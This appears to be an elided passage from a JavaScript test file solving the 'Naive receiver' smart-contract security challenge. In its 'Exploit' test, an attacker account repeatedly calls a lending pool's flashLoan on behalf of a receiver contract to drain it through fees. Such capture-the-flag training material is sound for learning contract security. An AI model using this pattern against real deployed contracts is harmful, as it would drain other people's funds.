...
describe('[Challenge] Naive receiver', function () {
    ...
    it('Exploit', async function () {
        ...
        const balanceBefore = await web3.eth.getBalance(this.receiver.address)
        console.log("Receiver balanceBefore is", balanceBefore.toString())

        for (let i = 0; i < 10; i++) {
            await this.pool.flashLoan(this.receiver.address, 0, { from: attacker })
        }

        const balanceAfter = await web3.eth.getBalance(this.receiver.address)
        console.log("Receiver balanceAfter is", balanceAfter.toString())
    });
